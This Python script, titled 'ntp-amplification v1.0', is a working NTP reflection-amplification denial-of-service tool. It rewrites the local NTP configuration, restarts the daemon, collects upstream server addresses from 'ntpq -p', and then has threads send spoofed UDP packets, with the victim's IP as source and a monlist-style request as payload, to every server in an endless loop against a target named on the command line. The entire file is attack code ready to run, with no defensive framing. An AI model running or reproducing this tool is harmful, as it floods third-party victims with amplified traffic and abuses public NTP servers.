#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send
import json
import socket
import sys
import threading
import subprocess
import time

CONFIG_PATH = "config.json"


class Config:
    def __init__(self, ntp_config_path, pools, server_count):
        self.ntp_config_path = ntp_config_path
        self.pools = pools
        self.server_count = server_count

    @classmethod
    def from_json_file(cls, json_file):
        with open(json_file, 'r') as f:
            json_data = f.read()
        return cls.from_json(json_data)

    @classmethod
    def from_json(cls, json_data):
        data = json.loads(json_data)
        ntp_config_path = data['ntp_config_path']
        pools = data['pools']
        server_count = data['server_count']
        config = cls(ntp_config_path, pools, server_count)
        config.removePools()
        config.addPools()
        return config

    def removePools(self):
        with open(self.ntp_config_path, 'r') as config_file:
            lines = config_file.readlines()
        with open(self.ntp_config_path, 'w') as config_file:
            for line in lines:
                if not line.startswith('server'):
                    config_file.write(line)

    def addPools(self):
        with open(self.ntp_config_path, "r") as f:
            content = f.read()
        for pool in self.pools:
            if "server " + pool not in content:
                with open(self.ntp_config_path, "a") as f:
                    f.write("server " + pool + "\n")


class NTPScanner:
    def __init__(self, config: Config):
        self.config = config
        self.restart_daemon()
        self.servers = []

    def restart_daemon(self):
        print("Restarting ntp daemon...")
        subprocess.run(['systemctl', 'restart', 'ntp'])
        print("Synchronizing ntp servers...")
        time.sleep(2 * self.config.server_count)

    def scan(self):
        self.servers.clear()
        print("Scanning for ntp servers...")
        output = subprocess.run(
            ["ntpq", "-p"], capture_output=True).stdout.decode()
        for line in output.split("\n"):
            refid = self.extract_ipv4_refid(line)
            if refid:
                self.servers.append(refid)

    def extract_ipv4_refid(self, row: str):
        fields = row.split(" ")
        if len(fields) < 3:
            return None
        refid = fields[2]
        if not is_ipv4(refid):
            return None
        return refid


def is_ipv4(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except socket.error:
        return False
    return True


def printHelp():
    header = "ntp-amplification v1.0"
    usage = "usage: python3 ntp-amplification <target ip>"
    manual = header + "\n\n" + usage
    print(manual)


def deny(server: str, target: str):
    payload = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=server, src=target) / \
        UDP(sport=80, dport=123)/Raw(load=payload)
    send(packet, loop=1, verbose=True)


def main():
    if len(sys.argv) != 2 or not is_ipv4(sys.argv[1]):
        printHelp()
        return

    config = Config.from_json_file(CONFIG_PATH)
    scanner = NTPScanner(config)

    target = sys.argv[1]
    threads = []

    try:
        scanner.scan()

        print("Starting to flood: " + target + " ...")
        print("Use CTRL+Z to stop attack")

        for server in scanner.servers:
            thread = threading.Thread(target=deny, args=(server, target))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        print("Flooding...")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("Script interrupted [CTRL + Z]... shutting down")


if __name__ == '__main__':
    main()
